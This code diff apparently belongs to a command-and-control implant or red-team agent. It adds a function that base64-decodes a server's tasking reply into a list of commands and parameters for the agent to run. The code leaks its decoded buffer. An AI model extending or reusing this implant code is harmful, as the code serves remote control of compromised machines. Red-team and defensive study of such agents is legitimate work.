@@ -175,7 +175,7 @@ void parse_checkin_reply(HttpResponse *response, CheckinReply *reply) {
 	
 	int offset = 0;
 	
-	reply->action = decoded_body[0];
+	reply->action = decoded_body[offset];
 	offset += 1;
 	
 	reply->callback_uuid = unpack_str(decoded_body, &offset);
@@ -221,4 +221,35 @@ char *generate_tasking_message(TaskingRequest *tasking) {
 	
 	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
 	return encoded_msg;
+}
+
+void parse_tasking_reply(HttpResponse *response, TaskingReply *reply) {
+	// Base64 decode the response and unpack the fields into a struct.
+	char *decoded_body = KERNEL32$VirtualAlloc(0, response->body_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	base64_decode(response->body, response->body_size, decoded_body);
+	
+	int offset = 0;
+	
+	reply->action = decoded_body[offset];
+	offset += 1;
+	
+	reply->tasking_size = decoded_body[offset];
+	offset += 1;
+	
+	size_t task_len = reply->tasking_size * sizeof(TaskInfo);
+	reply->tasks = KERNEL32$VirtualAlloc(0, task_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	for (int i = 0; i < reply->tasking_size; i++) {
+		TaskInfo task = { 0 };
+		
+		task.id = unpack_str(decoded_body, &offset);
+		task.command = unpack_str(decoded_body, &offset);
+		task.parameters = unpack_str(decoded_body, &offset);
+		task.timestamp = unpack_int(decoded_body, &offset);
+		
+		reply->tasks[i] = task;
+	}
+}
+
+void free_tasking_reply(TaskingReply *reply) {
+	if (reply->tasks != NULL) { KERNEL32$VirtualFree(reply->tasks, 0, MEM_RELEASE); }
 }
